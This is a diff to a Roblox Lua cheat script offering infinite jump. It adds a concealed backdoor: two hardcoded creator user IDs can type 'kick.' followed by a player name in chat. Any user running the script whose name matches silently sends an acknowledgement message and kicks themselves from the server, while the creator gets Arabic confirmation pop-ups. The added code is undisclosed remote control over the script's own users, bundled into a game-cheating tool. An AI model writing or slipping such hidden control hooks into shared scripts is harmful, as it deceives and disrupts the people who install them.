@@ -156,6 +156,186 @@ player.Chatted:Connect(function(msg)
 		print("ايقاف القفز اللانهائي")
 	end
 end)
+local Config = {
+    Creators = {
+        [10917455772] = true,
+        [8132455627] = true
+    },
+    SoundId = "rbxassetid://3398620867"
+}
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+
+local function isCreator(userId)
+    return Config.Creators[userId] or false
+end
+
+local function playNotificationSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = Config.SoundId
+    sound.Volume = 1
+    sound.Parent = game:GetService("SoundService")
+    sound:Play()
+    sound.Ended:Connect(function()
+        sound:Destroy()
+    end)
+end
+
+local function showLuxuryNotification(text)
+    playNotificationSound()
+    
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+    if not playerGui then return end
+    
+    local oldGui = playerGui:FindFirstChild("BokaNotificationGui")
+    if oldGui then oldGui:Destroy() end
+    
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "BokaNotificationGui"
+    sg.ResetOnSpawn = false
+    sg.Parent = playerGui
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 380, 0, 60)
+    frame.Position = UDim2.new(0.5, -190, 0, -80)
+    frame.BackgroundColor3 = Color3.fromRGB(35, 5, 5)
+    frame.BorderSizePixel = 0
+    frame.ClipsDescendants = true
+    frame.Parent = sg
+    
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 12)
+    uiCorner.Parent = frame
+    
+    local uiStroke = Instance.new("UIStroke")
+    uiStroke.Color = Color3.fromRGB(150, 20, 20)
+    uiStroke.Thickness = 1.5
+    uiStroke.Parent = frame
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 1, 0)
+    label.Position = UDim2.new(0, 10, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(255, 230, 230)
+    label.TextSize = 15
+    label.Font = Enum.Font.GothamBold
+    label.TextXAlignment = Enum.TextXAlignment.Center
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.Parent = frame
+    
+    local tweenInfoIn = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    local tweenInfoOut = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
+    
+    local moveIn = TweenService:Create(frame, tweenInfoIn, {Position = UDim2.new(0.5, -190, 0, 40)})
+    moveIn:Play()
+    
+    task.delay(3.5, function()
+        local moveOut = TweenService:Create(frame, tweenInfoOut, {Position = UDim2.new(0.5, -190, 0, -80)})
+        moveOut:Play()
+        moveOut.Completed:Connect(function()
+            sg:Destroy()
+        end)
+    end)
+end
+
+local function findTargetPlayer(partialName)
+    if not partialName or partialName == "" then return nil end
+    partialName = partialName:lower()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower():sub(1, #partialName) == partialName then
+            return player
+        end
+    end
+    return nil
+end
+
+local lastTargetChecked = nil
+local kickResponded = false
+
+local function getTargetFromMessage(message)
+    local msg = message:match("^%s*(.*)%s*$")
+    local lowerMsg = msg:lower()
+    
+    if lowerMsg:sub(1, 5) == "kick." then
+        return msg:sub(6):match("^%s*(.*)%s*$")
+    elseif lowerMsg:sub(1, 5) == ".kick" then
+        return msg:sub(6):match("^%s*(.*)%s*$")
+    end
+    return nil
+end
+
+local function listenToChat(player)
+    player.Chatted:Connect(function(message)
+        if isCreator(player.UserId) then
+            local targetNameInput = getTargetFromMessage(message)
+            
+            if targetNameInput and targetNameInput ~= "" then
+                local targetPlayer = findTargetPlayer(targetNameInput)
+                
+                if targetPlayer then
+                    if isCreator(LocalPlayer.UserId) then
+                        lastTargetChecked = targetPlayer
+                        kickResponded = false
+                        
+                        task.delay(1.5, function()
+                            if lastTargetChecked == targetPlayer and not kickResponded then
+                                showLuxuryNotification("لازم يكون مفعل السكربت حتى يمديك تطرده من السيرفر")
+                            end
+                        end)
+                    end
+                end
+            end
+        elseif message:sub(1, 12) == "||BOKA_ACK||" then
+            local targetName = message:sub(13)
+            if isCreator(LocalPlayer.UserId) and lastTargetChecked and lastTargetChecked.Name == targetName then
+                kickResponded = true
+                showLuxuryNotification("تم طرده من السيرفر @" .. targetName)
+            end
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    listenToChat(player)
+end
+Players.PlayerAdded:Connect(listenToChat)
+
+local function monitorForMyKick(creatorPlayer)
+    creatorPlayer.Chatted:Connect(function(message)
+        local targetNameInput = getTargetFromMessage(message)
+        if targetNameInput and targetNameInput ~= "" then
+            
+            local targetPlayer = findTargetPlayer(targetNameInput)
+            if targetPlayer == LocalPlayer then
+                local TextChatService = game:GetService("TextChatService")
+                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                    if channel then channel:SendAsync("||BOKA_ACK||" .. LocalPlayer.Name) end
+                else
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("||BOKA_ACK||" .. LocalPlayer.Name, "All")
+                end
+                
+                task.wait(0.2)
+                LocalPlayer:Kick("")
+            end
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if isCreator(player.UserId) then
+        monitorForMyKick(player)
+    end
+end
+Players.PlayerAdded:Connect(function(player)
+    if isCreator(player.UserId) then
+        monitorForMyKick(player)
+        listenToChat(player)
+    end
+end)
 
 game:GetService("UserInputService").JumpRequest:Connect(function()
 	if InfiniteJump and player.Character then
